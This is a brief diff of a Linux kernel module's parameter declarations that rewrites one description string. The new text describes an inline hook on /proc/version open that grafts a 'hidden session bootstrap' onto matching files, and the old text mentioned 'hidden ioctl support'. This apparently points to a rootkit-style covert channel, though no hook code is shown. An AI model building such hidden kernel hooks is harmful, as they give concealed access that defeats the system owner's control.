@@ -12,7 +12,7 @@ MODULE_PARM_DESC(tag, "Human-readable tag shown in debugfs output");
 bool hook_proc_version;
 module_param(hook_proc_version, bool, 0444);
 MODULE_PARM_DESC(hook_proc_version,
-		 "Clone and swap /proc/version inode file_operations to add hidden ioctl support");
+		 "Install an inline hook on /proc/version open to graft the hidden session bootstrap onto matching file instances");
 
 unsigned int hook_selftest_mode;
 module_param(hook_selftest_mode, uint, 0644);
